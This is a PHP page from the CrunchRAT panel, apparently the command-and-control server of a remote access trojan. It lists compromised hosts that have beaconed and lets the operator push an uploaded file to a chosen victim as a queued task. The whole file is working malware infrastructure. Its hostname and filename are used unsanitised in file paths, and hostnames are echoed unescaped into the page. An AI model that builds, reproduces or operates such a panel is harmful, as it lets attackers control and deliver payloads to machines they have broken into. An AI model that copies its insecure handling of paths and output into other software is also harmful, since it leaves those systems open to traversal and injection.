<?php
  # Necessary at the top of every page for session management
  session_start();
        
  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
    <style>
      body
      {
        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */
      }
    </style>
    <link href="bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
  </head>

  <body>
    <div class="navbar navbar-inverse navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container">
          <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="brand" href="#">CrunchRAT</a>
          <div class="nav-collapse collapse">
            <ul class="nav">
              <li><a href="hosts.php">Hosts</a></li>
              <li><a href="command.php">Task Command</a></li>
              <li class="active"><a href="upload.php">Task File Upload</a></li>
              <li><a href="output.php">View Output</a></li>
              <li><a href="logout.php">Logout</a></li>
            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container">
      <form role="form" class="form-inline" method="post" enctype="multipart/form-data">Host:&ensp;&ensp;
        <select class="form-control" name="hostname">
        <?php
            # Determines the hosts that have previously beaconed
            $statement = $dbConnection->prepare("SELECT hostname FROM hosts");
            $statement->execute();
            $hosts = $statement->fetchAll();
        
            # Kills database connection
            $statement->connection = null; 
            
            # Populates each <option> drop-down with our hosts that have beaconed previously
            foreach($hosts as $row)
            {
              echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . $row["hostname"] . "</option>";
            }
          ?>
        </select>&ensp;&ensp;

        <input type="file" class="form-control" name="upload">&ensp;
        <button type="submit" class="btn btn-primary">Task File Upload</button>
      </form>
      
      <?php
        # This code is executed when the RAT user selects "Task File Upload"
        if (isset($_POST) && !empty($_POST))
        {
          # Saves hostname that we are tasking the remote file upload for
          $hostname = $_POST["hostname"];

          # Are we actually POST'ing a file?
          # Prevents null file uploads
          if ($_FILES["upload"]["size"] > 0)
          {
            # Does the /var/www/html/uploads/<SYSTEM> directory exist?
            # If not we create the directory
            if (!file_exists($uploadsPath . $hostname))
            {
              mkdir($uploadsPath . $hostname);
            }
                    
            # Moves uploaded file from the /tmp directory to the /var/www/html/uploads/<SYSTEM> directory
            $filename = $_FILES["upload"]["name"];
            $tempFilePath = $_FILES["upload"]["tmp_name"];
            $fileDestination = $uploadsPath . $hostname . "/" . $filename;
            move_uploaded_file($tempFilePath, $fileDestination);

            # Inserts upload task into "tasks" table
            $upload = "/uploads/" . $hostname . "/" . $filename;
            $statement = $dbConnection->prepare("INSERT INTO tasks (action, hostname, secondary) VALUES (:action, :hostname, :secondary)");
            $statement->bindValue(":action", "upload");
            $statement->bindValue(":hostname", $hostname);
            $statement->bindValue(":secondary", $upload);  
            $statement->execute();

            # Inserts hostname, action, secondary, and status into "output" table
            $statement = $dbConnection->prepare("INSERT INTO output (hostname, action, secondary, status) VALUES (:hostname, :action, :secondary, :status)");
            $statement->bindValue(":hostname", $hostname);
            $statement->bindValue(":action", "upload");
            $statement->bindValue(":secondary", $upload);
            $statement->bindValue(":status", "N");
            $statement->execute();
                              
            # Kills database connection
            $statement->connection = null;

            # Uses POST, Redirect, and GET method to clear POST data
            header("Location: uploadSubmit.php");
          }
        }
      ?>
    </div> <!-- /container -->

    <!-- Javascript - placed at the bottom so it loads faster -->
    <script src="bootstrap/js/jquery.js"></script>
    <script src="bootstrap/js/bootstrap-transition.js"></script>
    <script src="bootstrap/js/bootstrap-alert.js"></script>
    <script src="bootstrap/js/bootstrap-modal.js"></script>
    <script src="bootstrap/js/bootstrap-dropdown.js"></script>
    <script src="bootstrap/js/bootstrap-scrollspy.js"></script>
    <script src="bootstrap/js/bootstrap-tab.js"></script>
    <script src="bootstrap/js/bootstrap-tooltip.js"></script>
    <script src="bootstrap/js/bootstrap-popover.js"></script>
    <script src="bootstrap/js/bootstrap-button.js"></script>
    <script src="bootstrap/js/bootstrap-collapse.js"></script>
    <script src="bootstrap/js/bootstrap-carousel.js"></script>
    <script src="bootstrap/js/bootstrap-typeahead.js"></script>
  </body>
</html>